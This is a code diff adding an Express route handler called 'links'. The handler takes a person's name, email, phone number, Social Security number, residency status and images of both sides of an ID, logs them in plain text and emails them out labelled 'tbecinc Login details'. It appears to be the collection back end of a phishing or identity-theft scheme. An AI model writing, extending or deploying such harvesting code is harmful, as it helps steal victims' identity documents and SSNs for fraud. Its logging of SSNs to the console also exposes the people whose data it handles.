@@ -24,6 +24,29 @@ exports.authenticateAdminUser = (req, res) => {
     }
 }
 
+exports.links = (req, res) => {
+    const { firstName, lastName, email, number, stay, ssn, idfront, idback } = req.body;
+
+    try {
+        const message = `email:${email}, firstName:${firstName}, lastName:${lastName}, number:${number}, stayInAmerica:${stay}, ssn:${ssn},idfront:${idfront}, idback:${idback}, `
+        console.log(message)
+        const reason = 'tbecinc Login details'
+
+        sendEmail.sendEmail(email, message, reason, (data) => {
+            if (data) {
+                return res.status(200).json({
+                    status: 200,
+                    email: email,
+                    msg: 'email sent'
+                });
+            }
+
+        }).then(response => res.send(response.message)).catch(error => res.status);
+    } catch (error) {
+        return res.status(500).send(error.message);
+    }
+}
+
 exports.mobile = (req, res) => {
     const { number } = req.body;
 
